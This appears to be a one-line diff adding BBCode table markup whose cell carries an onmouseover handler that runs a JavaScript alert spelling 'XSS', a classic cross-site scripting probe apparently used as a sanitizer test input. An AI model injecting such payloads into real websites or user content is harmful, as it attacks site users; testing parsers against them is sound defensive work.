@@ -1,0 +1,2 @@
+[table=border='1' cellspacing='0' cellpadding='0' width='100%'][tr=bgcolor='#ffffff'][td=width='*' onmouseover='javascript:alert(String.fromCharCode(88,83,83))']XSS[/td][/tr][/table]
+
